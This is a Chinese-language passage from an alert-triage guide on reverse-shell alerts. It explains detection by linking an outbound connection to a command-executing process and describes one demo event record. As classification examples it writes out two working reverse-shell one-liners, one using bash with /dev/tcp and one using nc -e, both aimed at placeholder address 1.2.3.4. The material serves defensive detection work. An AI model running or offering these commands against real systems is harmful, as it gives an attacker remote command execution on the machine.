# RS-01 · 这一类告警在说什么

## 一条反弹 Shell 告警，说的是一件什么样的事

**这台机器上有个进程，主动连出去，然后把一个 shell 挂到了那条连接上。**

判断它不是靠端口、不是靠加密、也不是靠编程语言 ——
Invicti 的原话是：

> 「实用的检测模型不是『识别某个具体载荷』，而是**关联三个条件**：
> **异常的父进程**（比如 web 服务器或应用进程）、出站连接、以及子进程创建。」

**决定性的是「网络通道」和「执行」之间的那条链路**（Signal Fieldnotes）：

```text
一条出站连接  +  这条连接上挂着一个能执行命令的进程
```

### 这一类真正要回答的问题

**不是「有没有外连」——** 外连是常态。

**是：这条外连，是不是一个能被人敲命令的 shell？**

- 如果进程是 `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` → **是，几乎没有别的解释**
- 如果进程是 `nc -e /bin/bash 1.2.3.4 4444` → **是**
- 如果进程是 `curl https://api.example.com/x` → **不是**

### demo 的数据量（重要）

**整个 demo 只有 1 条反弹 Shell 事件。**

```text
level      = 4（high）
state      = 1（risky）
remote_addr = 192.168.73.1     ← 内网地址
remote_port = 4444
repair      = 大于 1 个月 13 天
```

**所以这一类的判据几乎全部来自权威资料，样本基本全得构造。**
这一点必须写在 SOP 里 —— 不能让读者以为是「从数据里挖出来的」。
